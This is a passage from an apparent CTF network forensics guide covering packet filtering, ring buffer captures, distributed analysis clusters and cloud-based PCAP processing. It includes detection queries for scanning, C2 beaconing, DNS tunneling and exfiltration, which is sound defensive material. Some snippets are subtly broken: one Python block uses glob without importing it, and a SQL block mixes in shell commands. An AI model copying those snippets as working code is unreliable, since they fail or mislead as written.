tshark -r capture.pcap -Y "data" -T fields -e data.data | grep -E '[A-Za-z0-9+/]{20,}={0,2}'

# Filter packets with unusual payloads
tshark -r capture.pcap -Y "tcp.payload" -T fields -e tcp.payload | xxd -r -p | strings
```

**Suspicious Activity Patterns:**

```bash
# Port scanning indicators
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" -T fields -e ip.src | sort | uniq -c | sort -rn

# Potential C2 beaconing (repeated connections)
tshark -r capture.pcap -Y "tcp" -T fields -e ip.src -e ip.dst -e tcp.dstport | sort | uniq -c | sort -rn | head

# DNS tunneling indicators (long queries)
tshark -r capture.pcap -Y "dns.qry.name && dns.qry.name.len > 50" -w long_dns.pcap
```

### Performance Benchmarking

**Compare Filtering Efficiency:**

```bash
# Time BPF filtering
time tcpdump -r large.pcap 'tcp port 80' -w output.pcap

# Time Wireshark display filter
time tshark -r large.pcap -Y "tcp.port == 80" -w output.pcap

# [Inference] BPF filters generally execute faster as they operate at a lower level
```

**Memory Usage Comparison:**

```bash
# Monitor during filtering
/usr/bin/time -v tshark -r capture.pcap -Y "http" -w output.pcap
# Check "Maximum resident set size"
```

### Important Related Topics

- **Packet Carving**: Extracting files and objects from filtered PCAPs
- **Stream Reassembly**: Reconstructing TCP conversations from filtered segments
- **Statistical Analysis**: Using pre-filtered data for protocol hierarchy and conversation analysis
- **Automated Filtering Scripts**: Creating reusable filter chains for repetitive CTF scenarios

---

## Ring Buffer Captures

Ring buffer captures provide a continuous, memory-efficient method for packet capture by overwriting old data when storage limits are reached. This technique is essential in CTF scenarios where long-term monitoring or resource-constrained environments require sustained traffic analysis without exhausting disk space.

### Fundamental Concepts

A ring buffer operates as a circular data structure where the capture engine writes packets sequentially until reaching a predefined limit, then wraps around to overwrite the oldest data. This maintains the most recent network traffic while preventing storage exhaustion. Three primary ring buffer modes exist:

**Fixed file size ring buffers** maintain multiple files of specified size, rotating through them sequentially. When the last file reaches capacity, the capture wraps to the first file, overwriting previous data.

**Duration-based ring buffers** create new files at specified time intervals regardless of file size, useful for time-segmented analysis or compliance requirements.

**Fixed file count ring buffers** limit the total number of capture files, automatically deleting the oldest when creating new files beyond the limit.

### Tcpdump Ring Buffer Implementation

Tcpdump provides ring buffer functionality through the `-C` and `-W` parameters, enabling automated file rotation during extended captures.

```bash
# Basic ring buffer with 100MB file limit, 5 files maximum
tcpdump -i eth0 -C 100 -W 5 -w capture_ring.pcap

# Time-based rotation: new file every 3600 seconds (1 hour)
tcpdump -i eth0 -G 3600 -w capture_%Y%m%d_%H%M%S.pcap

# Combined size and count limits with compression
tcpdump -i eth0 -C 50 -W 10 -z gzip -w /tmp/ring_buffer.pcap
```

**Parameter breakdown:**

- `-C [size]`: File size in MB before rotation
- `-W [count]`: Maximum number of files to maintain
- `-G [seconds]`: Rotate based on time interval
- `-z [command]`: Post-rotation compression command
- `-w [filename]`: Output file pattern (use strftime format for time-based naming)

### Wireshark/Tshark Ring Buffer Configuration

Tshark offers more granular ring buffer controls than tcpdump, including packet-count-based rotation and multiple stop conditions.

```bash
# Ring buffer: 10 files, 50MB each
tshark -i eth0 -b filesize:51200 -b files:10 -w ring_capture.pcapng

# Duration-based: 5-minute intervals, maximum 20 files
tshark -i eth0 -b duration:300 -b files:20 -w timed_ring_%Y%m%d_%H%M%S.pcapng

# Packet count rotation: new file every 100,000 packets
tshark -i eth0 -b packets:100000 -b files:15 -w packet_ring.pcapng

# Combined conditions: 100MB OR 1 hour, whichever comes first
tshark -i eth0 -b filesize:102400 -b duration:3600 -b files:24 -w combined_ring.pcapng
```

**Ring buffer options (`-b`):**

- `filesize:[KB]`: Size threshold in kilobytes
- `files:[count]`: Maximum file count
- `duration:[seconds]`: Time interval rotation
- `packets:[count]`: Packet count threshold
- `interval:[seconds]`: Alternative time-based syntax

### Dumpcap for High-Performance Ring Buffers

Dumpcap, Wireshark's dedicated capture engine, provides optimal performance for ring buffer operations with minimal CPU overhead.

```bash
# High-performance ring buffer with minimal overhead
dumpcap -i eth0 -b filesize:204800 -b files:50 -w /mnt/capture/ring.pcapng

# Multiple interface ring buffer
dumpcap -i eth0 -i wlan0 -b duration:600 -b files:100 -w multi_if_ring.pcapng

# Ring buffer with capture filters for efficiency
dumpcap -i eth0 -f "tcp port 80 or tcp port 443" -b filesize:102400 -b files:30 -w filtered_ring.pcapng
```

### Memory-Mapped Ring Buffers with AF_PACKET

For maximum performance on Linux systems, AF_PACKET socket with PACKET_RX_RING provides kernel-level ring buffer support, minimizing packet loss at high traffic rates.

[Inference] Most modern packet capture libraries (libpcap 1.5+) automatically utilize AF_PACKET ring buffers when available, though direct implementation may improve performance in custom capture tools.

```bash
# Verify AF_PACKET support
tcpdump -i eth0 --version | grep -i "with TPACKET_V3"

# Force AF_PACKET usage (implicit in modern tcpdump)
tcpdump -i eth0 --packet-buffered -C 100 -W 10 -w capture.pcap
```

### Ring Buffer Analysis Strategies

**Continuous monitoring approach:**

```bash
# Start ring buffer capture
tshark -i eth0 -b filesize:102400 -b files:50 -w /tmp/monitor.pcapng &

# Periodic analysis of most recent file
while true; do
    latest_file=$(ls -t /tmp/monitor_* | head -1)
    tshark -r "$latest_file" -Y "http.request or dns" -T fields -e frame.time -e ip.src -e http.host
    sleep 300
done
```

**Incident retrospection:** When a security event is detected, ring buffers preserve preceding traffic context.

```bash
# Merge last 5 ring buffer files for incident analysis
mergecap -w incident_context.pcapng monitor_00045.pcapng monitor_00046.pcapng monitor_00047.pcapng monitor_00048.pcapng monitor_00049.pcapng

# Analyze merged capture around incident timestamp
tshark -r incident_context.pcapng -Y "frame.time >= \"2025-10-20 14:30:00\" and frame.time <= \"2025-10-20 14:45:00\""
```

### Storage Optimization Techniques

**Selective packet capture with snaplen:**

```bash
# Capture only headers (96 bytes) in ring buffer
tcpdump -i eth0 -s 96 -C 50 -W 20 -w headers_only.pcap

# Protocol-specific snaplen for efficiency
tshark -i eth0 -s 200 -f "port 443" -b filesize:51200 -b files:10 -w tls_headers.pcapng
```

**Compression integration:**

```bash
# Automatic gzip compression after rotation (tcpdump)
tcpdump -i eth0 -C 100 -W 10 -z gzip -w /var/log/captures/compressed_ring.pcap

# Manual compression pipeline for older files
find /var/log/captures -name "ring_*.pcap" -mmin +30 -exec gzip {} \;
```

**Real-time streaming to analysis tools:**

```bash
# Ring buffer with simultaneous streaming to Zeek
tshark -i eth0 -b filesize:102400 -b files:20 -w /tmp/ring.pcapng -w - | zeek -r -
```

### Resource Monitoring for Ring Buffer Operations

```bash
# Monitor disk I/O for capture interface
iostat -x 5 /dev/sda

# Check capture buffer drops
tcpdump -i eth0 -w /dev/null -c 100000
# Observe "packets dropped by kernel" in output

# Dumpcap statistics during ring buffer capture
dumpcap -i eth0 -b filesize:102400 -b files:10 -w ring.pcapng -q -S
```

### Common Pitfalls and Solutions

**Issue: Rapid file rotation causing analysis gaps**

```bash
# Increase file size to reduce rotation frequency
tshark -i eth0 -b filesize:512000 -b files:10 -w larger_ring.pcapng
```

**Issue: Packet drops during high-traffic scenarios**

```bash
# Increase kernel buffer size
tcpdump -i eth0 -B 131072 -C 200 -W 15 -w optimized_ring.pcap

# Alternative: use dumpcap with optimized settings
dumpcap -i eth0 -b filesize:204800 -b files:20 -n -w ring.pcapng
```

**Issue: Timestamp discontinuities across ring buffer files** [Inference] Ensure consistent system time synchronization (NTP) during multi-file captures to maintain temporal continuity when merging files for analysis.

---

## Distributed Analysis

Distributed analysis architectures enable CTF teams to process massive packet captures, handle geographically dispersed monitoring points, and leverage parallel processing for computationally intensive traffic analysis tasks. These approaches are essential when single-host analysis becomes a bottleneck.

### Architecture Patterns

**Centralized collection, distributed processing:** Multiple capture points forward traffic to a central storage system, where distributed workers perform parallel analysis. This pattern suits CTF scenarios with multiple network segments requiring coordinated investigation.

**Edge processing with centralized aggregation:** Initial analysis occurs at capture points, with only metadata, alerts, or filtered packets transmitted to central analysis infrastructure. This reduces bandwidth requirements and enables faster local response.

**Fully distributed peer-to-peer:** Each node performs independent capture and analysis, sharing results through distributed querying mechanisms. Optimal for resilient, scalable analysis across untrusted networks.

### Centralized Collection Architectures

**Traffic mirroring with SPAN/TAP to central collector:**

```bash
# Central collector receiving mirrored traffic
tcpdump -i eth0 -C 500 -W 100 -z gzip -w /storage/mirror_%Y%m%d_%H%M%S.pcap

# Distributed analysis workers accessing shared storage
# Worker 1: Protocol analysis
tshark -r /storage/mirror_20251020_143000.pcap -q -z io,phs -z conv,tcp

# Worker 2: Threat detection
tshark -r /storage/mirror_20251020_143000.pcap -Y "http.request.method == POST" -T fields -e ip.src -e http.host -e http.request.uri | sort | uniq -c | sort -rn

# Worker 3: File extraction
tshark -r /storage/mirror_20251020_143000.pcap --export-objects http,/tmp/extracted_objects/
```

**Remote packet capture with rpcapd:**

Rpcapd enables remote packet capture over the network, allowing centralized control of distributed capture points.

```bash
# On remote capture host: start rpcapd daemon
rpcapd -n -p 2002 -4

# On analysis host: capture from remote interface
tcpdump -i rpcap://192.168.1.100:2002/eth0 -w remote_capture.pcap

# Wireshark GUI connection to remote capture
# Interface: rpcap://[192.168.1.100]:2002/eth0
# (Configure in Capture -> Options -> Manage Interfaces -> Remote)

# Multiple remote sources with mergecap
tcpdump -i rpcap://192.168.1.100:2002/eth0 -w site1.pcap &
tcpdump -i rpcap://192.168.1.101:2002/eth0 -w site2.pcap &
mergecap -w combined_sites.pcap site1.pcap site2.pcap
```

[Unverified] Security considerations: rpcapd authentication mechanisms vary by implementation; ensure encrypted tunneling (SSH, VPN) when transmitting captures over untrusted networks.

**SSH-based remote capture:**

```bash
# Direct SSH packet capture with local analysis
ssh user@remote-host "tcpdump -i eth0 -w - 'port 80'" | wireshark -k -i -

# Buffered remote capture to local file
ssh user@remote-host "tcpdump -i eth0 -U -w -" > local_capture.pcap

# Remote capture with compression
ssh user@remote-host "tcpdump -i eth0 -w - | gzip -c" | gunzip | tshark -r -
```

### Parallel Processing with GNU Parallel

GNU Parallel enables efficient distribution of analysis tasks across multiple CPU cores or networked hosts.

```bash
# Split large PCAP for parallel processing
editcap -c 100000 huge_capture.pcap split_part.pcap

# Parallel analysis across split files
ls split_part_*.pcap | parallel -j 8 "tshark -r {} -Y 'http' -w http_from_{}"

# Distributed processing across multiple hosts
parallel --sshloginfile hostlist.txt \
  --workdir /tmp/analysis \
  --transfer \
  tshark -r {} -q -z io,stat,300 ::: *.pcap

# Content of hostlist.txt:
# user@analysis1.local
# user@analysis2.local
# user@analysis3.local
```

**Advanced parallel workflows:**

```bash
# Extract and analyze HTTP objects in parallel
tshark -r capture.pcap -Y http -T fields -e frame.number | \
  parallel -j 16 "tshark -r capture.pcap -Y 'frame.number == {}' --export-objects http,/tmp/obj_{}"

# Protocol hierarchy statistics from multiple captures
find /storage -name "*.pcap" | \
  parallel -j 4 --bar "tshark -r {} -q -z io,phs > {}.phs_stats"

# Parallel DNS analysis across captures
ls *.pcap | parallel -j 8 \
  "tshark -r {} -Y dns -T fields -e dns.qry.name | sort | uniq -c | sort -rn > {}.dns_queries"
```

### Distributed Analysis with Hadoop and MapReduce

[Unverified] Hadoop-based PCAP analysis frameworks (such as PCAP-Hadoop or custom implementations) enable petabyte-scale traffic analysis, though setup complexity may exceed CTF time constraints.

**Conceptual workflow:**

1. Store PCAP files in HDFS (Hadoop Distributed File System)
2. Implement MapReduce jobs for specific analysis tasks
3. Distribute computation across Hadoop cluster
4. Aggregate results from distributed workers

```python
# Example pseudo-code for PCAP MapReduce (not executable)
# Map function: extract features from packets
def map(pcap_chunk):
    for packet in pcap_chunk:
        if packet.has_layer('HTTP'):
            emit(packet['IP'].src, packet['HTTP'].host)

# Reduce function: aggregate per-source statistics
def reduce(src_ip, hosts):
    emit(src_ip, {'unique_hosts': len(set(hosts)), 'total_requests': len(hosts)})
```

### Distributed IDS/IPS with Zeek Clustering

Zeek (formerly Bro) provides native clustering support for distributed network security monitoring.

**Zeek cluster components:**

- **Manager**: Coordinates cluster operations, receives logs from workers
- **Logger**: Aggregates and writes log files
- **Proxy**: Intermediary for worker communication and data sharing
- **Workers**: Perform actual packet analysis on assigned traffic

```bash
# Example Zeek cluster configuration (node.cfg)
[manager]
type=manager
host=192.168.1.10

[logger]
type=logger
host=192.168.1.11

[proxy-1]
type=proxy
host=192.168.1.12

[worker-1]
type=worker
host=192.168.1.20
interface=eth0

[worker-2]
type=worker
host=192.168.1.21
interface=eth0
```

```bash
# Deploy Zeek cluster
zeekctl deploy

# Check cluster status
zeekctl status

# Distributed analysis across workers
zeekctl start

# Access aggregated logs
tail -f /var/log/zeek/current/conn.log
```

### Elasticsearch and Kibana for Distributed Analysis

Elasticsearch provides distributed search and analytics capabilities ideal for large-scale packet metadata analysis.

**PCAP to Elasticsearch pipeline:**

```bash
# Extract metadata with tshark and index to Elasticsearch
tshark -r capture.pcap -T json | \
  jq -c '{
    timestamp: ._source.layers.frame["frame.time"],
    src_ip: ._source.layers.ip["ip.src"],
    dst_ip: ._source.layers.ip["ip.dst"],
    protocol: ._source.layers.frame["frame.protocols"]
  }' | \
  curl -X POST "localhost:9200/packets/_bulk" --data-binary @-

# Alternative: use Packetbeat for direct packet->Elasticsearch ingestion
packetbeat -e -c packetbeat.yml
```

**Example packetbeat.yml configuration:**

```yaml
packetbeat.interfaces.device: eth0
packetbeat.flows.enabled: true
packetbeat.protocols:
  - type: http
    ports: [80, 8080, 8000]
  - type: dns
    ports: [53]
output.elasticsearch:
  hosts: ["localhost:9200"]
```

**Kibana queries for distributed analysis:**

```
# High-volume sources
GET packets/_search
{
  "size": 0,
  "aggs": {
    "top_sources": {
      "terms": {"field": "src_ip.keyword", "size": 20}
    }
  }
}

# Time-series traffic patterns
GET packets/_search
{
  "size": 0,
  "aggs": {
    "traffic_over_time": {
      "date_histogram": {"field": "timestamp", "interval": "1m"}
    }
  }
}
```

### Distributed Analysis with Moloch/Arkime

Arkime (formerly Moloch) is purpose-built for large-scale, indexed PCAP storage and distributed searching.

```bash
# Install Arkime (Debian/Ubuntu)
wget https://github.com/arkime/arkime/releases/download/v4.4.0/arkime_4.4.0-1_amd64.deb
dpkg -i arkime_4.4.0-1_amd64.deb

# Initialize Elasticsearch indices
/opt/arkime/db/db.pl http://localhost:9200 init

# Configure capture node (capture node 1)
# Edit /opt/arkime/etc/config.ini:
# [default]
# elasticsearch=localhost:9200
# interface=eth0
# pcapDir=/var/lib/arkime/pcap

# Start capture
systemctl start arkimecapture

# Start viewer (web interface)
systemctl start arkimeviewer

# Access web UI: http://localhost:8005
```

**Arkime distributed architecture:**

- Multiple capture nodes ingest traffic independently
- Centralized Elasticsearch cluster indexes metadata
- PCAP files stored locally or on shared storage
- Web interface provides unified search across all nodes

### Message Queue-Based Distribution

**Apache Kafka for packet streaming:**

[Inference] Kafka's high-throughput, low-latency characteristics make it suitable for real-time packet metadata distribution, though full PCAP streaming may require careful partition sizing and retention policies.

```bash
# Produce packet metadata to Kafka
tshark -i eth0 -T json | \
  kafka-console-producer --broker-list localhost:9092 --topic packets

# Consume from multiple analysis workers
kafka-console-consumer --bootstrap-server localhost:9092 --topic packets | \
  jq '.layers.ip["ip.src"]' | sort | uniq -c
```

**RabbitMQ for task distribution:**

```bash
# Publish PCAP file paths to RabbitMQ queue
for pcap in /storage/*.pcap; do
  echo "$pcap" | amqp-publish -u amqp://localhost -r analysis_queue
done

# Workers consume and analyze
amqp-consume -u amqp://localhost -q analysis_queue tshark -r - -q -z io,phs
```

### Performance Considerations

**Network bandwidth optimization:**

- Filter at source before transmission: `tcpdump -i eth0 'port 80 or port 443' -w - | ssh central 'cat > /storage/capture.pcap'`
- Use compression: `tcpdump -i eth0 -w - | gzip | ssh central 'gunzip | tcpdump -r -'`
- Transmit metadata only: `tshark -i eth0 -T json | ssh central 'cat > metadata.json'`

**Storage architecture:**

- RAID configurations for redundancy and performance
- SSD for metadata indices, HDD for bulk PCAP storage
- Distributed file systems (GlusterFS, Ceph) for multi-node access

**Processing optimization:**

- Load balancing across analysis workers based on CPU/memory availability
- Affinity-based processing: assign specific protocols or IP ranges to specialized workers
- Caching mechanisms for frequently accessed captures or analysis results

---

## Cloud Processing Options

Cloud platforms provide elastic computational resources for burst analysis workloads, long-term storage for large capture archives, and globally distributed analysis capabilities. CTF scenarios increasingly involve cloud infrastructure, making cloud-based traffic analysis skills essential.

### Cloud Storage Solutions

**Amazon S3 for PCAP storage:**

```bash
# Upload capture to S3
aws s3 cp large_capture.pcap s3://ctf-captures/investigations/

# Upload with server-side encryption
aws s3 cp sensitive_capture.pcap s3://ctf-captures/secure/ --sse AES256

# Parallel upload for large files
aws s3 cp huge_capture.pcap s3://ctf-captures/ --storage-class STANDARD_IA

# Lifecycle policy for automatic archival (example JSON)
{
  "Rules": [{
    "Id": "Archive old captures",
    "Status": "Enabled",
    "Transitions": [{
      "Days": 30,
      "StorageClass": "GLACIER"
    }]
  }]
}
```

**Google Cloud Storage:**

```bash
# Upload to GCS
gsutil cp capture.pcap gs://ctf-analysis-bucket/

# Parallel composite upload for large files
gsutil -o GSUtil:parallel_composite_upload_threshold=150M cp huge.pcap gs://bucket/

# Download for analysis
gsutil cp gs://ctf-analysis-bucket/capture.pcap - | tshark -r -
```

**Azure Blob Storage:**

```bash
# Upload via Azure CLI
az storage blob upload --account-name ctfanalysis --container-name captures --file capture.pcap --name 2025-10-20/capture.pcap

# Download and analyze
az storage blob download --account-name ctfanalysis --container-name captures --name capture.pcap --file - | tshark -r -
```

### Cloud Compute for Analysis

**AWS EC2 burst analysis:**

```bash
# Launch high-CPU instance for analysis
aws ec2 run-instances \
  --image-id ami-0abcdef1234567890 \
  --instance-type c5.4xlarge \
  --key-name ctf-analysis \
  --security-group-ids sg-12345678 \
  --user-data '#!/bin/bash
    apt-get update
    apt-get install -y tshark tcpdump
    aws s3 cp s3://ctf-captures/huge_capture.pcap /tmp/
    tshark -r /tmp/huge_capture.pcap -q -z io,phs > /tmp/stats.txt
    aws s3 cp /tmp/stats.txt s3://ctf-results/
    shutdown -h now'

# Spot instances for cost-effective batch processing
aws ec2 request-spot-instances \
  --spot-price "0.50" \
  --instance-count 5 \
  --type "one-time" \
  --launch-specification file://analysis-spec.json
```

**Google Compute Engine:**

```bash
# Create analysis instance
gcloud compute instances create pcap-analyzer \
  --machine-type=n1-highcpu-16 \
  --image-family=debian-11 \
  --image-project=debian-cloud \
  --boot-disk-size=500GB \
  --metadata=startup-script='#!/bin/bash
    apt-get update && apt-get install -y tshark
    gsutil cp gs://ctf-captures/capture.pcap /tmp/
    tshark -r /tmp/capture.pcap -Y http -w /tmp/http_only.pcap
    gsutil cp /tmp/http_only.pcap gs://ctf-results/'

# Preemptible instances for cost savings
gcloud compute instances create preemptible-analyzer \
  --preemptible \
  --machine-type=n1-highcpu-8 \
  --image-family=debian-11
```

**Azure Virtual Machines:**

```bash
# Create analysis VM
az vm create \
  --resource-group CTFAnalysis \
  --name analyzer-vm \
  --image UbuntuLTS \
  --size Standard_F16s_v2 \
  --admin-username azureuser \
  --ssh-key-values ~/.ssh/id_rsa.pub

# Execute remote analysis
ssh azureuser@<vm-ip> "
  sudo apt-get install -y tshark
  az storage blob download --account-name ctfanalysis --container-name captures --name capture.pcap --file /tmp/capture.pcap
  tshark -r /tmp/capture.pcap -q -z conv,tcp
"
```

### Serverless Analysis Architectures

**AWS Lambda for event-driven PCAP processing:**

[Inference] Lambda function execution limits (15-minute timeout, 10GB memory maximum as of January 2025) constrain PCAP analysis to smaller files or chunked processing approaches.

```python
# lambda_function.py - triggered on S3 upload
import boto3
import subprocess
import json

def lambda_handler(event, context):
    s3 = boto3.client('s3')
    bucket = event['Records'][0]['s3']['bucket']['name']
    key = event['Records'][0]['s3']['object']['key']
    
    # Download PCAP
    local_path = f'/tmp/{key.split("/")[-1]}'
    s3.download_file(bucket, key, local_path)
    
    # Analyze with tshark
    result = subprocess.run(
        ['tshark', '-r', local_path, '-q', '-z', 'conv,tcp'],
        capture_output=True,
        text=True
    )
    
    # Upload results
    result_key = f'results/{key.split("/")[-1]}.txt'
    s3.put_object(
        Bucket='ctf-analysis-results',
        Key=result_key,
        Body=result.stdout
    )
    
    return {
        'statusCode': 200,
        'body': json.dumps(f'Analyzed {key}')
    }
```

**Google Cloud Functions:**

```python
# main.py - triggered by GCS upload
from google.cloud import storage
import subprocess

def analyze_pcap(event, context):
    bucket_name = event['bucket']
    file_name = event['name']
    
    client = storage.Client()
    bucket = client.bucket(bucket_name)
    blob = bucket.blob(file_name)
    
    local_path = f'/tmp/{file_name}'
    blob.download_to_filename(local_path)
    
    result = subprocess.run(
        ['tshark', '-r', local_path, '-Y', 'http', '-T', 'fields', '-e', 'http.host'],
        capture_output=True,
        text=True
    )
    
    result_blob = bucket.blob(f'results/{file_name}.txt')
    result_blob.upload_from_string(result.stdout)
```

**Azure Functions:**

```csharp
// Blob-triggered C# function
public static void Run(
    [BlobTrigger("captures/{name}", Connection = "AzureWebJobsStorage")] Stream myBlob,
    string name,
    [Blob("results/{name}.txt", FileAccess.Write)] Stream outputBlob,
    ILogger log)
{
    var tempPath = Path.Combine(Path.GetTempPath(), name);
    using (var fileStream = File.Create(tempPath))
    {
        myBlob.CopyTo(fileStream);
    }
    
    var process = Process.Start(new ProcessStartInfo
    {
        FileName = "tshark",
        Arguments = $"-r {tempPath} -q -z io,phs",
        RedirectStandardOutput = true
    });
    
    process.StandardOutput.BaseStream.CopyTo(outputBlob);
}
```

### Container-Based Cloud Analysis

**Docker containers for reproducible analysis:**

```dockerfile
# Dockerfile for PCAP analysis environment
FROM ubuntu:22.04

RUN apt-get update && apt-get install -y \
    tshark \
    tcpdump \
    zeek \
    python3-scapy \
    && rm -rf /var/lib/apt/lists/*

COPY analyze.sh /usr/local/bin/
RUN chmod +x /usr/local/bin/analyze.sh

ENTRYPOINT ["/usr/local/bin/analyze.sh"]
```

```bash
# Build and push to registry
docker build -t pcap-analyzer:latest .
docker tag pcap-analyzer:latest myregistry.azurecr.io/pcap-analyzer:latest
docker push myregistry.azurecr.io/pcap-analyzer:latest

# Run analysis in cloud container service
# AWS ECS
aws ecs run-task \
  --cluster analysis-cluster \
  --task-definition pcap-analyzer \
  --overrides '{"containerOverrides": [{"name":"analyzer","command":["s3://ctf-captures/capture.pcap"]}]}'

# Google Cloud Run
gcloud run jobs create pcap-analysis \
  --image=gcr.io/project/pcap-analyzer \
  --args="gs://ctf-captures/capture.pcap"
gcloud run jobs execute pcap-analysis

# Azure Container Instances
az container create \
  --resource-group CTFAnalysis \
  --name pcap-analyzer \
  --image myregistry.azurecr.io/pcap-analyzer:latest \
  --command-line "analyze.sh https://ctfanalysis.blob.core.windows.net/captures/capture.pcap"
```

### Kubernetes for Distributed Cloud Analysis

**K8s job for parallel PCAP processing:**

```yaml
# pcap-analysis-job.yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: pcap-analysis
spec:
  parallelism: 10
  completions: 100
  template:
    spec:
      containers:
      - name: analyzer
        image: pcap-analyzer:latest
        command: ["analyze.sh"]
        env:
        - name: PCAP_URL
          value: "s3://ctf-captures/split-$(JOB_COMPLETION_INDEX).pcap"
        - name: OUTPUT_URL
          value: "s3://ctf-results/result-$(JOB_COMPLETION_INDEX).json"
        resources:
          requests:
            memory: "4Gi"
            cpu: "2"
          limits:
            memory: "8Gi"
            cpu: "4"
      restartPolicy: Never
```

```bash
# Deploy to managed Kubernetes
kubectl apply -f pcap-analysis-job.yaml

# Monitor progress
kubectl get jobs
kubectl logs -l job-name=pcap-analysis

# Cleanup
kubectl delete job pcap-analysis
```

### Cloud-Native Analysis Tools

**AWS Athena for PCAP metadata queries:**

[Unverified] AWS Athena can query PCAP-derived metadata stored as Parquet or JSON in S3, enabling SQL-based analysis without provisioning servers.

```sql
-- Create external table from PCAP metadata
CREATE EXTERNAL TABLE packet_metadata (
  timestamp TIMESTAMP,
  src_ip STRING,
  dst_ip STRING,
  src_port INT,
  dst_port INT,
  protocol STRING,
  length INT
)
STORED AS PARQUET
LOCATION 's3://ctf-captures/metadata/';

-- Query top talkers
SELECT src_ip, COUNT(*) as packet_count
FROM packet_metadata
WHERE timestamp BETWEEN TIMESTAMP '2025-10-20 00:00:00' AND TIMESTAMP '2025-10-20 23:59:59'
GROUP BY src_ip
ORDER BY packet_count DESC
LIMIT 20;

-- Identify potential data exfiltration
SELECT src_ip, dst_ip, SUM(length) as total_bytes
FROM packet_metadata
WHERE dst_port = 443
GROUP BY src_ip, dst_ip
HAVING total_bytes > 1000000000
ORDER BY total_bytes DESC;
```

**Google BigQuery for massive-scale analysis:**

```sql
-- Load PCAP metadata into BigQuery table
bq load \
  --source_format=PARQUET \
  ctf_dataset.packet_metadata \
  gs://ctf-captures/metadata/*.parquet

# Time-series analysis of traffic patterns
SELECT 
    TIMESTAMP_TRUNC(timestamp, HOUR) AS hour,
    protocol,
    COUNT(*) AS packet_count,
    SUM(length) AS total_bytes
FROM 
    `project.ctf_dataset.packet_metadata`
WHERE 
    DATE(timestamp) = '2025-10-20'
GROUP BY 
    hour, protocol
ORDER BY 
    hour, total_bytes DESC;

# Detect anomalous connection patterns
WITH connection_stats AS (
    SELECT 
        src_ip,
        COUNT(DISTINCT dst_ip) AS unique_destinations,
        COUNT(DISTINCT dst_port) AS unique_ports,
        COUNT(*) AS connection_count
    FROM 
        `project.ctf_dataset.packet_metadata`
    WHERE 
        timestamp >= TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 1 HOUR)
    GROUP BY 
        src_ip
)
SELECT * 
FROM connection_stats 
WHERE 
    unique_destinations > 100 OR unique_ports > 50
ORDER BY 
    connection_count DESC;
````

**Azure Data Explorer (Kusto) for log analytics:**

```kusto
// Ingest PCAP metadata from Blob Storage
.create table PacketMetadata (
  Timestamp: datetime,
  SourceIP: string,
  DestIP: string,
  SourcePort: int,
  DestPort: int,
  Protocol: string,
  Length: int
)

.ingest into table PacketMetadata (
  'https://ctfanalysis.blob.core.windows.net/metadata/*.json'
)

// Identify port scanning activity
PacketMetadata
| where Timestamp > ago(1h)
| summarize UniqueDestPorts = dcount(DestPort), TotalConnections = count() by SourceIP
| where UniqueDestPorts > 20
| order by UniqueDestPorts desc

// Protocol distribution analysis
PacketMetadata
| summarize TotalBytes = sum(Length), PacketCount = count() by Protocol
| extend PercentageBytes = round(100.0 * TotalBytes / toscalar(PacketMetadata | summarize sum(Length)), 2)
| order by TotalBytes desc
````

### Cloud-Based Network Security Monitoring

**VPC Flow Logs analysis (AWS):**

```bash
# Enable VPC Flow Logs
aws ec2 create-flow-logs \
  --resource-type VPC \
  --resource-ids vpc-12345678 \
  --traffic-type ALL \
  --log-destination-type s3 \
  --log-destination arn:aws:s3:::ctf-flow-logs

# Query with Athena after creating table
# (AWS provides CloudFormation template for Flow Logs table creation)

# Download and analyze locally
aws s3 sync s3://ctf-flow-logs/ /tmp/flow-logs/

# Parse flow logs with Python
python3 << 'EOF'
import gzip
import csv
from collections import Counter

src_ips = Counter()
dst_ports = Counter()

for log_file in glob.glob('/tmp/flow-logs/**/*.gz', recursive=True):
    with gzip.open(log_file, 'rt') as f:
        reader = csv.DictReader(f, delimiter=' ', 
                                fieldnames=['version','account-id','interface-id',
                                            'srcaddr','dstaddr','srcport','dstport',
                                            'protocol','packets','bytes','start','end',
                                            'action','log-status'])
        for row in reader:
            if row['action'] == 'ACCEPT':
                src_ips[row['srcaddr']] += int(row['packets'])
                dst_ports[row['dstport']] += 1

print("Top source IPs:", src_ips.most_common(10))
print("Top destination ports:", dst_ports.most_common(10))
EOF
```

**Google Cloud VPC Flow Logs:**

```bash
# Enable flow logs for subnet
gcloud compute networks subnets update SUBNET_NAME \
  --enable-flow-logs \
  --logging-aggregation-interval=interval-5-sec \
  --logging-flow-sampling=1.0

# Query in BigQuery (flow logs automatically exported)
bq query --use_legacy_sql=false '
SELECT
  jsonPayload.connection.src_ip,
  jsonPayload.connection.dest_ip,
  jsonPayload.connection.dest_port,
  COUNT(*) as connection_count
FROM `project.dataset.vpc_flows`
WHERE timestamp >= TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 1 HOUR)
GROUP BY src_ip, dest_ip, dest_port
ORDER BY connection_count DESC
LIMIT 20
'
```

**Azure Network Watcher:**

```bash
# Enable NSG flow logs
az network watcher flow-log create \
  --resource-group CTFAnalysis \
  --nsg NetworkSecurityGroup \
  --name FlowLogAnalysis \
  --storage-account ctfanalysislogs \
  --enabled true \
  --retention 30

# Analyze with Traffic Analytics
az network watcher flow-log configure \
  --nsg NetworkSecurityGroup \
  --resource-group CTFAnalysis \
  --enabled true \
  --traffic-analytics true \
  --workspace /subscriptions/.../workspaces/CTFWorkspace
```

### Cloud-Based Packet Broker Solutions

**AWS Gateway Load Balancer for traffic distribution:**

[Inference] GWLB enables centralized traffic inspection by routing VPC traffic through third-party security appliances, useful for deploying distributed IDS/IPS or packet capture solutions in cloud environments.

```bash
# Create Gateway Load Balancer endpoint
aws ec2 create-vpc-endpoint \
  --vpc-id vpc-12345678 \
  --service-name com.amazonaws.vpce.us-east-1.vpce-svc-analysis \
  --vpc-endpoint-type GatewayLoadBalancer \
  --subnet-ids subnet-12345678

# Route traffic through GWLB for inspection
aws ec2 create-route \
  --route-table-id rtb-12345678 \
  --destination-cidr-block 10.0.0.0/8 \
  --vpc-endpoint-id vpce-12345678
```

**Google Cloud Packet Mirroring:**

```bash
# Create packet mirroring policy
gcloud compute packet-mirrorings create mirror-policy \
  --region=us-central1 \
  --collector-ilb=LOAD_BALANCER_URL \
  --network=default \
  --mirrored-subnets=subnet-1,subnet-2

# Mirrored traffic sent to ILB forwarding to analysis instances
```

### Cost Optimization Strategies

**Storage tiering:**

